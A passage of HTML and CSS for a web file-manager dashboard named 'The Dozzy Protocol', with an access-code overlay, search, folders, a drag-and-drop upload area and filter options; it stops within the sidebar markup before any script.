<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Dozzy Protocol - VIP Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: #f4f6f8;
            color: #111;
            min-height: 100vh;
            transition: background 0.3s ease, color 0.3s ease;
        }

        body.dark-mode {
            background: #111;
            color: #f4f6f8;
        }

        /* ===== ACCESS OVERLAY ===== */
        .access-overlay {
            position: fixed;
            inset: 0;
            background: linear-gradient(135deg, #111 0%, #222 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            animation: fadeIn 0.3s ease;
        }

        .access-box {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .dark-mode .access-box {
            background: #222;
            color: white;
        }

        .access-logo {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 10px;
            letter-spacing: -1px;
        }

        .access-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            margin: 20px 0;
            text-align: center;
            letter-spacing: 1px;
        }

        .access-button {
            background: #111;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }

        .access-button:hover {
            background: #333;
        }

        /* ===== TOP BAR ===== */
        .topbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 18px 30px;
            background: white;
            border-bottom: 2px solid #e5e7eb;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
        }

        .dark-mode .topbar {
            background: #222;
            border-bottom: 2px solid #333;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .logo {
            font-weight: 700;
            font-size: 20px;
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-icon {
            width: 28px;
            height: 28px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 14px;
        }

        .topbar-controls {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .file-count {
            font-size: 14px;
            opacity: 0.8;
            font-weight: 500;
            background: #f3f4f6;
            padding: 4px 12px;
            border-radius: 20px;
        }

        .dark-mode .file-count {
            background: #333;
        }

        .updates-btn, .dark-mode-toggle, .refresh-btn {
            padding: 8px 16px;
            border-radius: 8px;
            background: #f3f4f6;
            border: none;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .dark-mode .updates-btn, .dark-mode .dark-mode-toggle, .dark-mode .refresh-btn {
            background: #333;
            color: white;
        }

        .updates-btn:hover, .dark-mode-toggle:hover, .refresh-btn:hover {
            background: #e5e7eb;
        }

        .dark-mode .updates-btn:hover, .dark-mode .dark-mode-toggle:hover, .dark-mode .refresh-btn:hover {
            background: #444;
        }

        .refresh-btn.refreshing {
            background: #3b82f6;
            color: white;
        }

        .dark-mode .refresh-btn.refreshing {
            background: #2563eb;
        }

        .search-container {
            flex: 1;
            max-width: 500px;
            margin: 0 40px;
            position: relative;
        }

        .search {
            width: 100%;
            border: 1px solid #ddd;
            border-radius: 10px;
            padding: 10px 15px 10px 40px;
            font-size: 15px;
            background: #f9fafb;
            transition: 0.2s ease;
        }

        .dark-mode .search {
            background: #333;
            border-color: #444;
            color: white;
        }

        .search:focus {
            background: white;
            border-color: #111;
            box-shadow: 0 0 0 3px rgba(0,0,0,0.08);
            outline: none;
        }

        .dark-mode .search:focus {
            background: #222;
            border-color: #667eea;
        }

        .search-icon {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
            font-size: 14px;
        }

        .search-predictions {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: white;
            border: 1px solid #ddd;
            border-radius: 0 0 10px 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            z-index: 1000;
            max-height: 300px;
            overflow-y: auto;
            display: none;
        }

        .dark-mode .search-predictions {
            background: #222;
            border-color: #444;
            color: white;
        }

        .prediction-item {
            padding: 12px 15px;
            cursor: pointer;
            border-bottom: 1px solid #f3f4f6;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .dark-mode .prediction-item {
            border-bottom: 1px solid #333;
        }

        .prediction-item:hover {
            background: #f9fafb;
        }

        .dark-mode .prediction-item:hover {
            background: #333;
        }

        .prediction-name {
            font-weight: 600;
            flex: 1;
        }

        .prediction-type {
            font-size: 12px;
            background: #111;
            color: white;
            padding: 2px 8px;
            border-radius: 12px;
        }

        .dark-mode .prediction-type {
            background: #444;
        }

        .filter-toggle {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            cursor: pointer;
            padding: 8px 12px;
            border-radius: 8px;
            transition: background 0.2s;
        }

        .filter-toggle:hover {
            background: #f3f4f6;
        }

        .dark-mode .filter-toggle:hover {
            background: #333;
        }

        /* ===== FOLDER BAR ===== */
        .folder-bar {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 15px 30px;
            background: white;
            border-bottom: 1px solid #e5e7eb;
            overflow-x: auto;
        }

        .dark-mode .folder-bar {
            background: #222;
            border-bottom: 1px solid #333;
        }

        .folder-btn {
            padding: 8px 16px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            background: white;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 6px;
            position: relative;
        }

        .dark-mode .folder-btn {
            background: #333;
            border-color: #444;
            color: white;
        }

        .folder-btn:hover {
            background: #f3f4f6;
            border-color: #111;
        }

        .dark-mode .folder-btn:hover {
            background: #444;
            border-color: #667eea;
        }

        .folder-btn.active-folder {
            background: #111;
            color: white;
            border-color: #111;
        }

        .dark-mode .folder-btn.active-folder {
            background: #667eea;
            border-color: #667eea;
        }

        .folder-btn i {
            font-size: 12px;
        }

        .add-folder-btn {
            padding: 8px 12px;
            border: 1px dashed #d1d5db;
            border-radius: 8px;
            background: white;
            color: #6b7280;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .dark-mode .add-folder-btn {
            background: #333;
            border-color: #444;
            color: #9ca3af;
        }

        .add-folder-btn:hover {
            border-color: #111;
            color: #111;
        }

        .dark-mode .add-folder-btn:hover {
            border-color: #667eea;
            color: white;
        }

        /* ===== TOAST SYSTEM ===== */
        .toast {
            position: fixed;
            top: 100px;
            right: 30px;
            background: #111;
            color: white;
            padding: 12px 20px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
            z-index: 1000;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            animation: slideInRight 0.3s ease;
            max-width: 300px;
        }

        .dark-mode .toast {
            background: #222;
        }

        .toast.success {
            background: #10b981;
        }

        .toast.error {
            background: #ef4444;
        }

        .toast.warning {
            background: #f59e0b;
        }

        .toast.info {
            background: #3b82f6;
        }

        .toast-undo {
            margin-left: 10px;
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            padding: 4px 8px;
                    border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: background 0.2s;
        }

        .toast-undo:hover {
            background: rgba(255,255,255,0.3);
        }

        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        @keyframes slideOutRight {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }

        /* ===== UPLOAD FEEDBACK ===== */
        .upload-feedback {
            position: fixed;
            top: 100px;
            right: 30px;
            background: #10b981;
            color: white;
            padding: 12px 20px;
            border-radius: 10px;
            display: none;
            align-items: center;
            gap: 10px;
            z-index: 1000;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            animation: slideInRight 0.3s ease;
        }

        .upload-feedback.error {
            background: #ef4444;
        }

        /* ===== UPLOAD AREA ===== */
        .upload-area {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 30px 20px;
            border: 2px dashed #d1d5db;
            border-radius: 20px;
            background: white;
            margin: 30px 30px 20px 30px;
            cursor: default;
            transition: all 0.3s ease;
            position: relative;
            min-height: 180px;
        }

        .dark-mode .upload-area {
            background: #222;
            border-color: #444;
        }

        .upload-area.drag-active {
            border-color: #667eea;
            background: rgba(102, 126, 234, 0.05);
            border-style: solid;
            transform: scale(1.02);
        }

        .dark-mode .upload-area.drag-active {
            background: rgba(102, 126, 234, 0.1);
        }

        .upload-hint {
            margin-top: 15px;
            font-size: 14px;
            color: #6b7280;
            text-align: center;
            max-width: 300px;
        }

        .dark-mode .upload-hint {
            color: #9ca3af;
        }

        .supported-files {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
            margin-top: 15px;
            max-width: 400px;
        }

        .file-badge {
            background: #f3f4f6;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
            color: #111;
        }

        .dark-mode .file-badge {
            background: #333;
            color: white;
        }

        /* ===== MAIN LAYOUT ===== */
        .container {
            display: flex;
            min-height: calc(100vh - 80px);
        }

        /* ===== LEFT SIDE ===== */
        .left {
            flex: 1;
            padding: 0;
            display: flex;
            flex-direction: column;
        }

        .action-section {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 0 30px 20px 30px;
        }

        .add-btn {
            width: 90px;
            height: 90px;
            border: 2px dashed #d1d5db;
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            margin-bottom: 15px;
            cursor: pointer;
            background: white;
            transition: all 0.2s;
            color: #6b7280;
        }

        .dark-mode .add-btn {
            background: #222;
            border-color: #444;
            color: #9ca3af;
        }

        .add-btn:hover {
            border-color: #111;
            background: #f8fafc;
            color: #111;
            transform: scale(1.05);
        }

        .dark-mode .add-btn:hover {
            border-color: #667eea;
            background: #333;
            color: white;
        }

        .add-btn-text {
            font-size: 13px;
            margin-top: 6px;
            font-weight: 600;
        }

        .add-form {
            display: none;
            margin: 0 30px 30px 30px;
            gap: 15px;
            flex-wrap: wrap;
            align-items: center;
            background: white;
            padding: 20px;
            border-radius: 14px;
            border: 1px solid #e5e7eb;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }

        .dark-mode .add-form {
            background: #222;
            border-color: #333;
        }

        .add-input {
            border: 1px solid #d1d5db;
            border-radius: 8px;
            padding: 10px 14px;
            font-size: 15px;
            min-width: 200px;
            transition: border 0.2s;
        }

        .dark-mode .add-input {
            background: #333;
            border-color: #444;
            color: white;
        }

        .add-input:focus {
            border-color: #111;
            outline: none;
        }

        .dark-mode .add-input:focus {
            border-color: #667eea;
        }

        .add-button {
            border: none;
            background: #111;
            color: white;
            padding: 10px 20px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 8px;
            transition: background 0.2s;
        }

        .add-button:hover {
            background: #333;
        }

        .add-button.cancel {
            background: #6b7280;
        }

        /* ===== FILE GRID ===== */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 16px;
            flex-grow: 1;
            min-height: 200px;
            padding: 0 30px 30px 30px;
            transition: all 0.3s ease;
        }

        /* PINNED INDICATOR */
        .pinned-indicator {
            grid-column: 1 / -1;
            margin-bottom: 10px;
            padding-left: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 16px;
            font-weight: 600;
            color: #f59e0b;
        }

        .dark-mode .pinned-indicator {
            color: #fbbf24;
        }

        .pinned-indicator i {
            font-size: 14px;
        }

        /* FILE CARD - UPDATED LAYOUT */
        .file {
            background: white;
            border: 1px solid #e5e7eb;
            border-radius: 12px;
            padding: 16px;
            cursor: pointer;
            transition: 0.25s ease;
            display: grid;
            grid-template-columns: 50px 1fr auto;
            align-items: center;
            gap: 12px;
            position: relative;
            overflow: hidden;
            min-height: 110px;
            user-select: none;
        }

        .dark-mode .file {
            background: #222;
            border-color: #333;
        }

        .file:hover {
            transform: translateY(-4px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
            border-color: #cbd5e1;
        }

        .dark-mode .file:hover {
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            border-color: #444;
        }

        .file.pinned {
            border-left: 4px solid #f59e0b;
        }

        .file-header {
            display: flex;
            flex-direction: column;
            gap: 4px;
            overflow: hidden;
        }

        .file-name {
            font-weight: 700;
            font-size: 14px;
            word-break: break-word;
            overflow: hidden;
            text-overflow: ellipsis;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            line-clamp: 2;
            -webkit-box-orient: vertical;
            cursor: text;
            padding-right: 8px;
        }

        .file-name.editing {
            cursor: text;
            background: #f8fafc;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            padding: 4px 8px;
            outline: none;
            font-family: inherit;
            font-size: 14px;
            font-weight: 700;
            -webkit-line-clamp: initial;
        }

        .dark-mode .file-name.editing {
            background: #333;
            border-color: #444;
            color: white;
        }

        .file-type {
            font-size: 10px;
            background: #111;
            color: white;
            padding: 3px 8px;
            border-radius: 20px;
            font-weight: 600;
            flex-shrink: 0;
            width: fit-content;
            opacity: 0.9;
            text-align: center;
        }

        .dark-mode .file-type {
            background: #444;
        }

        .file-meta {
            font-size: 11px;
            color: #6b7280;
            line-height: 1.4;
            overflow: hidden;
        }

        .dark-mode .file-meta {
            color: #9ca3af;
        }

        .file-meta i {
            margin-right: 5px;
            width: 12px;
            font-size: 10px;
        }

        .file-size {
            display: inline-block;
            margin-top: 6px;
            font-size: 10px;
            background: #f3f4f6;
            padding: 2px 6px;
            border-radius: 10px;
        }

        .dark-mode .file-size {
            background: #333;
        }

        .file-actions {
            display: flex;
            gap: 4px;
            opacity: 0;
            pointer-events: none;
            transform: translateX(10px);
            transition: all 0.2s ease;
            min-width: 70px;
            justify-self: end;
        }

        .file:hover .file-actions {
            opacity: 1;
            pointer-events: auto;
            transform: translateX(0);
        }

        .pin-btn, .delete-btn {
            width: 22px;
            height: 22px;
            border-radius: 50%;
            border: none;
            font-size: 10px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .pin-btn {
            background: #f3f4f6;
            color: #6b7280;
        }

        .pin-btn.pinned {
            background: #f59e0b;
            color: white;
        }

        .delete-btn {
            background: #ef4444;
            color: white;
        }

        .pin-btn:hover, .delete-btn:hover {
            transform: scale(1.1);
        }

        .empty-grid {
            grid-column: 1 / -1;
            text-align: center;
            padding: 60px 20px;
            color: #9ca3af;
            border: 2px dashed #d1d5db;
            border-radius: 14px;
            margin: 20px 0;
        }

        .dark-mode .empty-grid {
            border-color: #444;
        }

        .empty-grid i {
            font-size: 48px;
            margin-bottom: 16px;
            opacity: 0.5;
        }

        .empty-grid h3 {
            font-size: 18px;
            margin-bottom: 8px;
            color: #6b7280;
        }

        .dark-mode .empty-grid h3 {
            color: #9ca3af;
        }

        /* ===== RIGHT SIDE ===== */
        .right {
            width: 320px;
            padding: 30px 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            background: white;
            border-left: 1px solid #e5e7eb;
        }

        .dark-mode .right {
            background: #222;
            border-left: 1px solid #333;
        }

        .filter-box {
            padding: 0;
        }

        .filter-box h3 {
            margin-bottom: 20px;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .filter-group {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .filter-category {
            display: flex;
            flex-direction: column;
        }

        .filter-label {
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            margin-bottom: 12px;
            font-weight: 600;
            font-size: 15px;
        }

        .filter-checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid #d1d5db;
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .dark-mode .filter-checkbox {
            border-color: #444;
        }

        .filter-checkbox.checked {
            background: #111;
            border-color: #111;
            color: white;
        }

        .dark-mode .filter-checkbox.checked {
            background: #667eea;
            border-color: #667eea;
        }

        .filter-options {
            display: none;
            margin-left: 30px;
            margin-top: 5px;
            font-size: 14px;
        }

        .filter-options.show {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .filter-option {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            padding: 6px 0;
        }

        .filter-option:hover {
            color: #111;
        }

        .dark-mode .filter-option:hover {
            color: white;
        }

        .last-updated {
            padding: 15px;
            font-weight: 500;
            text-align: center;
            background: #f8fafc;
            border-radius: 10px;
            font-size: 14px;
            color: #6b7280;
            border: 1px solid #e5e7eb;
        }

        .dark-mode .last-updated {
            background: #333;
            border-color: #444;
            color: #9ca3af;
        }

        /* ===== MODAL ===== */
        .modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(6px);
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.2s ease;
            z-index: 1000;
        }

        .modal-backdrop {
            position: absolute;
            inset: 0;
            z-index: 1;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            animation: slideUp 0.25s ease;
            background: white;
            border-radius: 18px;
            padding: 30px;
            max-width: 800px;
            width: 90%;
            max-height: 85vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
            position: relative;
            z-index: 2;
        }

        .dark-mode .modal-content {
            background: #222;
            color: white;
        }

        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 2px solid #f3f4f6;
        }

        .dark-mode .modal-header {
            border-bottom: 2px solid #333;
        }

        .modal-title {
            font-size: 22px;
            font-weight: 700;
        }

        .close-modal {
            font-size: 24px;
            cursor: pointer;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
        }

        .close-modal:hover {
            background: #f3f4f6;
        }

        .dark-mode .close-modal:hover {
            background: #333;
        }

        .file-info {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #6b7280;
            padding-bottom: 20px;
            border-bottom: 1px solid #f3f4f6;
        }

        .dark-mode .file-info {
            color: #9ca3af;
            border-bottom: 1px solid #333;
        }

        .file-info-item {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .file-content-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .file-content-label {
            font-weight: 600;
            margin-bottom: 10px;
            font-size: 15px;
        }

        .file-content {
            white-space: pre-wrap;
            font-family: 'Menlo', 'Monaco', 'Courier New', monospace;
            background: #f8fafc;
            padding: 20px;
            border-radius: 10px;
            flex: 1;
            min-height: 450px;
            max-height: 50vh;
            outline: none;
            line-height: 1.6;
            border: 1px solid #e5e7eb;
            font-size: 14px;
            transition: all 0.2s;
            resize: vertical;
            overflow: auto;
        }

        .file-content:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .dark-mode .file-content {
            background: #333;
            border: 1px solid #444;
            color: white;
        }

        .file-content:focus {
            background: white;
            border-color: #111;
        }

        .dark-mode .file-content:focus {
            background: #222;
            border-color: #667eea;
        }

        .modal-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 25px;
        }

        .modal-actions-left {
            display: flex;
            gap: 12px;
        }

        .modal-btn {
            border: none;
            padding: 10px 20px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.2s;
        }

        .modal-btn.download {
            background: #10b981;
            color: white;
        }

        .modal-btn.download:hover {
            background: #059669;
        }

        .modal-btn.delete {
            background: #ef4444;
            color: white;
        }

        .modal-btn.delete:hover {
            background: #dc2626;
        }

        .modal-btn.save {
            background: #111;
            color: white;
        }

        .modal-btn.save:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .dark-mode .modal-btn.save {
            background: #667eea;
        }

        .modal-btn.save:hover:not(:disabled) {
            background: #333;
        }

        .dark-mode .modal-btn.save:hover:not(:disabled) {
            background: #764ba2;
        }

        .modal-btn.cancel {
            background: #f3f4f6;
            color: #374151;
        }

        .dark-mode .modal-btn.cancel {
            background: #333;
            color: white;
        }

        .modal-btn.cancel:hover {
            background: #e5e7eb;
        }

        .dark-mode .modal-btn.cancel:hover {
            background: #444;
        }

        /* ===== CHANGELOG MODAL ===== */
        .changelog-modal {
            display: none;
        }

        .changelog-content {
            background: white;
            border-radius: 18px;
            padding: 30px;
            max-width: 600px;
            width: 90%;
            max-height: 70vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
            position: relative;
            z-index: 2;
        }

        .dark-mode .changelog-content {
            background: #222;
            color: white;
        }

        .changelog-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .version-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
        }

        .changelog-section {
            margin-bottom: 25px;
        }

        .changelog-section h4 {
            font-size: 16px;
            margin-bottom: 10px;
            color: #111;
        }

        .dark-mode .changelog-section h4 {
            color: white;
        }

        .changelog-item {
            padding: 8px 0 8px 20px;
            border-left: 2px solid #e5e7eb;
            margin-bottom: 8px;
            font-size: 14px;
        }

        .dark-mode .changelog-item {
            border-left: 2px solid #333;
        }

        .changelog-item.new {
            border-left-color: #10b981;
        }

        .changelog-item.fixed {
            border-left-color: #f59e0b;
        }

        /* ===== DRAG & DROP INDICATORS ===== */
        .folder-drop-overlay {
            position: absolute;
            inset: 0;
            background: rgba(102, 126, 234, 0.2);
            border: 2px dashed #667eea;
            border-radius: 8px;
            display: none;
            justify-content: center;
            align-items: center;
            color: #667eea;
            font-weight: bold;
            z-index: 10;
        }

        .dark-mode .folder-drop-overlay {
            background: rgba(102, 126, 234, 0.3);
            color: white;
        }

        .folder-btn.drop-target .folder-drop-overlay {
            display: flex;
        }

        /* ===== TRASH FOLDER ===== */
        .folder-btn.trash-folder {
            position: relative;
            color: #ef4444;
        }

        .folder-btn.trash-folder i {
            color: #ef4444;
        }

        .trash-count {
            position: absolute;
            top: -5px;
            right: -5px;
            background: #ef4444;
            color: white;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 10px;
            min-width: 18px;
            text-align: center;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 1200px) {
            .grid {
                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            }
        }

        @media (max-width: 1024px) {
            .container {
                flex-direction: column;
            }
            
            .right {
                width: 100%;
                border-left: none;
                border-top: 1px solid #e5e7eb;
                padding: 20px;
            }
            
            .dark-mode .right {
                border-top: 1px solid #333;
            }
            
            .filter-group {
                flex-direction: row;
                flex-wrap: wrap;
                gap: 30px;
            }
            
            .filter-category {
                min-width: 200px;
            }
        }

        @media (max-width: 768px) {
            .topbar {
                flex-direction: column;
                gap: 15px;
                padding: 15px;
            }
            
            .logo-section {
                width: 100%;
                justify-content: space-between;
            }
            
            .topbar-controls {
                width: 100%;
                justify-content: space-between;
                flex-wrap: wrap;
            }
            
            .search-container {
                margin: 15px 0;
                width: 100%;
            }
            
            .folder-bar {
                padding: 15px;
                flex-wrap: wrap;
                gap: 8px;
            }
            
            .folder-btn, .add-folder-btn {
                font-size: 13px;
                padding: 6px 12px;
            }
            
            .upload-area, .action-section, .add-form, .grid {
                margin-left: 15px;
                margin-right: 15px;
            }
            
            .action-section {
                flex-direction: column;
                align-items: flex-start;
                gap: 20px;
            }
            
            .add-form {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .add-input {
                width: 100%;
            }
            
            .grid {
                grid-template-columns: 1fr;
            }
            
            .modal-actions {
                flex-direction: column;
                gap: 15px;
            }
            
            .modal-actions-left {
                width: 100%;
                justify-content: space-between;
            }
        }

        /* ===== UTILITY CLASSES ===== */
        .hidden {
            display: none !important;
        }

        .flex {
            display: flex;
        }
    </style>
</head>

<body>
    <!-- ACCESS OVERLAY -->
    <div class="access-overlay" id="accessOverlay">
        <div class="access-box">
            <div class="access-logo">
                <div class="logo-icon">D</div>
                The Dozzy Protocol
            </div>
            <p style="margin-bottom: 20px; opacity: 0.8;">Enter VIP access code to continue</p>
            <input type="password" class="access-input" id="accessInput" placeholder="Enter access code" autocomplete="off">
            <button class="access-button" onclick="checkAccess()">Access Dashboard</button>
            <p style="margin-top: 20px; font-size: 13px; opacity: 0.6;">Version 3.0 • Professional Edition</p>
        </div>
    </div>

    <!-- MAIN APP (HIDDEN UNTIL ACCESS GRANTED) -->
    <div id="mainApp" style="display: none;">
        <!-- TOP BAR -->
        <div class="topbar">
            <div class="logo-section">
                <div class="logo">
                    <div class="logo-icon">D</div>
                    The Dozzy Protocol
                </div>
                <div class="file-count" id="fileCount">0 files</div>
            </div>
            
            <div class="search-container">
                <div class="search-icon"><i class="fas fa-search"></i></div>
                <input type="text" class="search" id="searchInput" placeholder="Search files..." 
                       onkeyup="handleSearchInput()" onfocus="showSearchPredictions()" onblur="hideSearchPredictions()">
                <div class="search-predictions" id="searchPredictions"></div>
            </div>
            
            <div class="topbar-controls">
                <button class="refresh-btn" onclick="reloadPage()" id="refreshBtn">
                    <i class="fas fa-redo-alt"></i> Refresh
                </button>
                <button class="updates-btn" onclick="openChangelog()">
                    <i class="fas fa-history"></i> Updates
                </button>
                <button class="dark-mode-toggle" onclick="toggleDarkMode()" id="darkModeToggle">
                    <i class="fas fa-moon"></i> Dark
                </button>
                <div class="filter-toggle" onclick="toggleFilters()">
                    <i class="fas fa-sliders-h"></i>
                    <span>Filters</span>
                </div>
            </div>
        </div>

        <!-- FOLDER BAR -->
        <div class="folder-bar" id="folderBar">
            <!-- Folders will be dynamically added here -->
        </div>

        <div class="container">
            <!-- LEFT SIDE -->
            <div class="left">
                <!-- UPLOAD AREA -->
                <div class="upload-area" id="uploadArea">
                    <div class="add-btn" onclick="triggerFileInput()">
                        <i class="fas fa-plus"></i>
                        <div class="add-btn-text">Add File</div>
                    </div>
                    
                    <div class="upload-hint" id="uploadHint">
                        Drag & drop files here or click "+" to browse
                    </div>
                    
                    <div class="supported-files">
                        <span class="file-badge">.txt</span>
                        <span class="file-badge">.pdf</span>
                        <span class="file-badge">.doc/.docx</span>
                        <span class="file-badge">.xls/.xlsx</span>
                        <span class="file-badge">.jpg/.png</span>
                        <span class="file-badge">.zip/.rar</span>
                        <span class="file-badge">.exe</span>
                        <span class="file-badge">.js/.html/.css</span>
                        <span class="file-badge">.mp3/.mp4</span>
                        <span class="file-badge">.json/.xml</span>
                    </div>
                    
                    <input type="file" class="add-input" id="realFileUpload" multiple style="display: none;">
                </div>

                <div class="add-form" id="addForm">
                    <input type="text" class="add-input" id="fileName" placeholder="Custom name (optional)">
                    <input type="text" class="add-input" id="fileOwner" placeholder="Owner (default: dzxdoz_)" value="dzxdoz_">
                    <button class="add-button" onclick="addNewFile()">
                        <i class="fas fa-upload"></i> Upload Files
                    </button>
                    <button class="add-button cancel" onclick="toggleAddForm()">Cancel</button>
                </div>

                <!-- FILE GRID -->
                <div class="grid" id="fileGrid">
                    <!-- Files will be dynamically added here -->
                    <div class="empty-grid" id="emptyState">
                        <i class="fas fa-cloud-upload-alt"></i>
                        <h3>No files uploaded yet</h3>
                        <p>Drag & drop files here or click "+" to add files</p>
                    </div>
                </div>
            </div>

            <!-- RIGHT SIDE -->
            <div class="right" id="sidebar">
                <div class="filter-box">
                    <h3><i class="fas fa-filter"></i> Filter Options</h3>
                    <div class="filter-group">
                        <div class="filter-category">
                            <div class="filter-label" onclick="toggleFilterOptions('date')">
                                <div class="filter-checkbox" id="dateCheckbox"></div>
                                <span>Date Created</span>
                            </div>
                            <div class="filter-options" id="dateOptions">
                                <label class="filter-option">
                                    <input type="radio" name="date" id="dateNewest" onchange="setDateFilter('newest')">
                                    Newest first
                                </label>
                                <label class="filter-option">
                                    <input type="radio" name="date" id="dateOldest" onchange="setDateFilter('oldest')">
                                    Oldest first
                                </label>
                            </div>
                        </div>

                        <div class="filter-category">
                            <div class="filter-label" onclick="toggleFilterOptions('type')">
                                <div class="filter-checkbox" id="typeCheckbox"></div>
                                <span>File Type</span>
                            </div>
                            <div class="filter-options" id="typeOptions">
                                <label class="filter-option">
                                    <input type="checkbox" id="typeExe" onchange="toggleTypeFilter('exe')">
                                    .exe
                                </label>
                                <label class="filter-option">
                                    <input type="checkbox" id="typeTxt" onchange="toggleTypeFilter('txt')">
                                    .txt
                                </label>
                                <label class="filter-option">
                                    <input type="checkbox" id="typePdf" onchange="toggleTypeFilter('pdf')">
                                    .pdf
                                </label>
                                <label class="filter-option">
                                    <input type="checkbox" id="typeZip" onchange="toggleTypeFilter('zip')">
                                    .zip
                                </label>
                            </div>
                        </div>

                        <div class="filter-category">
                            <div class="filter-label" onclick="toggleFilterOptions('size')">
                                <div class="filter-checkbox" id="sizeCheckbox"></div>
                                <span>File Size</span>
                            </div>
